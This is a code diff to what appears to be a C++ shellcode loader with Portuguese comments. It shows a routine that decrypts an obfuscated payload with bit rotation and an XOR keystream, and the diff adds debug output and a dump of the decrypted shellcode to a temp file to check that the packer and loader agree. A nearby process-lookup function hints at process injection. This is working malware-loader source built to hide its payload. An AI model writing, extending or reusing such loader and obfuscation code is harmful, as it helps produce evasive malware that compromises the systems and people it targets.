@@ -180,8 +180,33 @@ void LoadShellcodeFromBytes(std::vector<uint8_t>& sc)
         v = (uint8_t)((v >> 3) | (v << 5));
         sc[i] = v ^ stream[i & 15];
     }
-    DBGF("LoadShellcode: decrypted %zu bytes, first bytes = %02X %02X %02X %02X %02X",
-         sc.size(), sc[0], sc[1], sc[2], sc[3], sc[4]);
+    DBGF("LoadShellcode: decrypted %zu bytes, first 32 = %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X",
+         sc.size(),
+         sc[0],sc[1],sc[2],sc[3],sc[4],sc[5],sc[6],sc[7],
+         sc[8],sc[9],sc[10],sc[11],sc[12],sc[13],sc[14],sc[15],
+         sc[16],sc[17],sc[18],sc[19],sc[20],sc[21],sc[22],sc[23],
+         sc[24],sc[25],sc[26],sc[27],sc[28],sc[29],sc[30],sc[31]);
+
+    // DIAGNOSTIC: dump decrypted shellcode em %TEMP%\sc_decrypted.bin
+    // compara com shellcode original (Bytes.hpp) ou com o binario antes
+    // do pack_bin: se diferir, encoder/decoder nao batem.
+    wchar_t tmp[MAX_PATH]{};
+    DWORD tlen = GetTempPathW(MAX_PATH, tmp);
+    if (tlen) {
+        wchar_t path[MAX_PATH]{};
+        wcscpy_s(path, tmp);
+        wcscat_s(path, L"sc_decrypted.bin");
+        HANDLE hf = CreateFileW(path, GENERIC_WRITE, 0, NULL,
+                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hf != INVALID_HANDLE_VALUE) {
+            DWORD wr = 0;
+            WriteFile(hf, sc.data(), (DWORD)sc.size(), &wr, NULL);
+            CloseHandle(hf);
+            DBGF("LoadShellcode: dumped %u bytes to %%TEMP%%\\sc_decrypted.bin", wr);
+        } else {
+            ERR("LoadShellcode: CreateFile pra dump falhou");
+        }
+    }
 }
 
 DWORD FindProcessByName(const wchar_t* processName)
